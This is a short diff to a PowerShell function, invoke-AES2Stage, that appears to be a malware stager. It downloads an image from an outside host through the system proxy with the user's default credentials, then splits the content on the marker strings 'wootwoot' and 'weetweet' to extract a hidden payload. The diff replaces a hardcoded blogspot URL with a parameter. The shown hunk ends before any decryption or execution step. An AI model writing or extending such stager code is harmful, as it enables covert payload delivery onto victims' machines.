@@ -1,10 +1,16 @@
 function invoke-AES2Stage
 {
+  
+  
+          Param (
+     
+            [string]$ImageUrl
+       )  
 $request = New-Object System.Net.WebCLient
 $proxy = New-Object System.Net.webproxy
 $request.proxy = $proxy
 $request.usedefaultcredentials = "true"
-$inputentirestring = $request.Downloadstring("https://4.bp.blogspot.com/-e4-qZIRq0l0/VrNFM0tL1CI/AAAAAAAAAE4/nGUHo5FCs9U/s1600/qwerty.png")
+$inputentirestring = $request.Downloadstring($ImageUrl)
 [array] $xvalue = ([regex]'wootwoot').split($inputentirestring)
 
 [array] $yvalue = ([regex]'weetweet').split($xvalue[1])
